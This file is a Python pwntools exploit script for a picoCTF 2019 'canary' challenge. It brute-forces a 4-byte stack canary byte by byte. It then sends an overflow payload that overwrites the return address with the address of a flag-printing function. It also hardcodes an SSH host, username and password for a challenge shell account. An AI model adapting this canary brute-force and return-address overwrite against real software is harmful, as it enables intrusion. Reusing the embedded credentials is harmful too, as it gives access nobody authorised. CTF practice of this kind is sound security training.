#coding=utf-8
from pwn import *
import time

debug = 1
if not debug:
    s = ssh(host = '2019shell1.picoctf.com', user = 'zeze', password = 'h9h9ji3g4go6')
    s.set_working_directory('/problems/canary_2_dffbf795b4788666d54a993a5e41d145')

buf_to_canary = 32
canary = 'ex;Y'
while len(canary) < 4:
    for i in range(256):
        if debug:	
            p = process('./vuln')
        else:
            p = s.process('./vuln')

        p.sendlineafter('length of the entry:', '1000')
        payload = 'a' * buf_to_canary + canary + chr(i)
        p.recvuntil('Input> ')
        p.send(payload)
        res = p.recvall(1)
        if 'Ok' in res:
            canary += chr(i)
            print canary
            time.sleep(1)
            break

buf = 0xffffd498
ret = 0xffffd4cc
display_flag = 0x565557ed
flag = ''
while not flag:
    if debug:
        p = process('./vuln')
    else:
        p = s.process('./vuln')
    p.sendlineafter('length of the entry:', '1000')
    payload = 'a' * buf_to_canary + canary + 'a' * (ret - buf - buf_to_canary - len(canary)) + p32(display_flag)
    p.recvuntil('Input> ')
    p.send(payload)
    res = p.recvall(1)
    if 'picoCTF' in res:
        flag = res
        print flag

